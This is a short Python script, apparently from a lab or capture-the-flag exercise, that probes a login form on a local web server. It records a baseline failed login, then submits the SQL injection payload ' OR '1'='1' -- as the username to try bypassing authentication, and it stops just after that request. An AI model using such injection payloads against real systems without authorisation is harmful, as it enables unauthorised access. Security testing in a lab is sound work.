import requests
import re

url = "http://127.0.0.1:32989/index.php"
session = requests.Session()

def get_response(username, password="test"):
    """Get full response details"""
    data = {'username': username, 'password': password}
    response = session.post(url, data=data, timeout=10)
    return {
        'size': len(response.content),
        'status': response.status_code,
        'text': response.text,
        'cookies': dict(response.cookies),
        'headers': dict(response.headers)
    }

# Test 1: Baseline (normal invalid login)
print("="*70)
print("[TEST 1] BASELINE - Invalid credentials")
print("="*70)
baseline = get_response("invalid_user", "invalid_pass")
print(f"Size: {baseline['size']} bytes")
print(f"Status: {baseline['status']}")
print(f"Cookies: {baseline['cookies']}")
print(f"Has 'welcome': {'welcome' in baseline['text'].lower()}")
print(f"Has 'Access Restricted': {'Access Restricted' in baseline['text']}")
print(f"Content excerpt:\n{baseline['text'][:800]}\n")

# Test 2: Simple SQLi payload
print("="*70)
print("[TEST 2] SQLi Payload - ' OR '1'='1' --")
print("="*70)
payload_result = get_response("' OR '1'='1' --")
